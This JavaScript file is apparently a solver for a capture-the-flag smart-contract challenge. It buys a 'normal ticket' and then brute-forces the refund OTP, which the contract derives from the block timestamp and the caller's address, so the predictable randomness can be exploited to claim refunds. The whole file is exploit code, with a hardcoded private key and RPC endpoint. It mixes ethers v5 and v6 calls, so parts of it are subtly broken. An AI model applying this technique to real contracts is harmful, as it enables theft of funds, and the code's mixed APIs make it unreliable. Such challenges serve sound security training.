const { ethers } = require("ethers")
const axios = require("axios")

const ABI = [
  { inputs: [], stateMutability: "payable", type: "constructor" },
  {
    inputs: [],
    name: "buyNormalTicket",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [],
    name: "buyPartyTicket",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [],
    name: "isBought",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "isSolved",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [{ internalType: "address", name: "", type: "address" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [{ internalType: "uint256", name: "otp", type: "uint256" }],
    name: "refundNormalTicket",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
]

class CustomProvider {
  constructor(url) {
    this.url = url
  }

  async send(method, params) {
    const response = await axios.post(
      this.url,
      {
        jsonrpc: "2.0",
        id: 1,
        method,
        params,
      },
      {
        headers: {
          "Content-Type": "application/json",
        },
      }
    )
    return response.data.result
  }

  async getBlockNumber() {
    return BigInt(await this.send("eth_blockNumber", []))
  }

  async getGasPrice() {
    return BigInt(await this.send("eth_gasPrice", []))
  }

  async getBlock(blockTag) {
    const block = await this.send("eth_getBlockByNumber", [blockTag, false])
    return {
      number: BigInt(block.number),
      timestamp: BigInt(block.timestamp),
    }
  }

  async getTransactionCount(address) {
    return BigInt(
      await this.send("eth_getTransactionCount", [address, "latest"])
    )
  }
}

class CustomSigner {
  constructor(privateKey, provider) {
    this.signer = new ethers.Wallet(privateKey, provider)
  }

  async getTransactionCount() {
    // Call getTransactionCount directly from the signer
    return await this.signer.getTransactionCount()
  }

  async sendTransaction(transaction) {
    const nonce = await this.getTransactionCount() // Get nonce
    const gasPrice = await this.signer.provider.getGasPrice()

    const tx = {
      ...transaction,
      nonce: nonce,
      gasPrice: gasPrice,
      gasLimit: 1000000n, // Set a high gas limit
      chainId: 31337, // Set the chainId
    }

    const signedTx = await this.signer.signTransaction(tx)
    const txHash = await this.signer.provider.send("eth_sendRawTransaction", [
      signedTx,
    ])

    // Wait for transaction to be mined
    while (true) {
      const receipt = await this.signer.provider.send(
        "eth_getTransactionReceipt",
        [txHash]
      )
      if (receipt) {
        return receipt
      }
      await new Promise((resolve) => setTimeout(resolve, 1000)) // Wait 1 second before checking again
    }
  }
}

async function breakLocket(contractAddress, privateKey, providerUrl) {
  console.log("Connecting to the network...")
  const provider = new CustomProvider(providerUrl)
  const signer = new CustomSigner(privateKey, provider)

  console.log("Connecting to the contract...")
  const contract = new ethers.Contract(contractAddress, ABI, signer)

  console.log("Buying a normal ticket...")
  const buyTx = await contract.buyNormalTicket({
    value: ethers.parseEther("5"), // Fix here: use ethers.utils.parseEther
  })
  console.log("Buy transaction hash:", buyTx.hash)
  console.log("Waiting for transaction to be mined...")
  await buyTx.wait()
  console.log("Bought a normal ticket")

  console.log("Getting the current block...")
  const block = await provider.getBlock("latest")
  const timestamp = block.timestamp

  console.log("Attempting to find the correct OTP...")
  for (let i = 0; i <= 5; i++) {
    const possibleTimestamp = timestamp + BigInt(i)
    const packedData = ethers.solidityPacked(
      ["uint256", "address"],
      [possibleTimestamp, signer.signer.address]
    )
    const hash = ethers.keccak256(packedData)
    const otp = ethers.BigNumber.from(hash).mod(1000000) // Fix here: using BigNumber for OTP

    console.log(`Trying OTP: ${otp} for timestamp ${possibleTimestamp}`)

    try {
      const refundTx = await contract.refundNormalTicket(otp)
      console.log("Refund transaction hash:", refundTx.hash)
      console.log("Waiting for transaction to be mined...")
      await refundTx.wait()
      console.log(`Success! Refunded with OTP: ${otp}`)
      return
    } catch (error) {
      console.log(`Failed with OTP: ${otp}`)
    }
  }

  console.log("Failed to find correct OTP")
}

const contractAddress = "0x4EB012007C08Cf9A0AA425D0A85b4Dd2c7feF526"
const privateKey =
  "0x52464b083bf8a9ab9d6c97092810a17dc8e481f9ac42cec14650256e2315f5c7"
const providerUrl =
  "http://103.145.226.92:48334/6edc0037-9b89-4d7b-8357-89ea9e515e24"

breakLocket(contractAddress, privateKey, providerUrl)
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("An error occurred:", error)
    process.exit(1)
  })
